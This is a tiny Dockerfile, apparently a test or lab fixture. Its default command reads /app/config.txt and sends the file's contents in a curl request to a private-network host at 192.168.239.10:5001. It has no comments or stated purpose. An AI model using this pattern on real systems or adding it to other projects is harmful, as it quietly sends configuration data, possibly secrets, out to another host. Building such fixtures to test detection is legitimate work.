FROM alpine:3.24

WORKDIR /app

RUN apk add --no-cache curl

CMD ["sh", "-c", "curl -s http://192.168.239.10:5001/r/5/$(cat /app/config.txt)"]
